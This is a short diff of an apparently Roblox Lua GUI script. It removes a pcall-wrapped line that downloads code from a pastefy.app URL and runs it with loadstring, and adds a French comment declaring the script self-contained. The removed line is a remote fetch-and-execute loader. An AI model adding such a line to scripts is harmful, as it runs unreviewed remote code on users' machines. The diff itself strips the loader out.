@@ -481,10 +481,7 @@ local function createModeButton(text, order)
     return btn
 end
 
--- External load (optional, wrapped in pcall)
-pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/uVkblNDV/raw"))()
-end)
+-- Script autonome : aucun code externe n'est exécuté au démarrage.
 
 local AutoRiddleBtn = createModeButton("AUTO RIDDLE: OFF", 1)
 local Msg1Btn       = createModeButton("1 Message", 2)
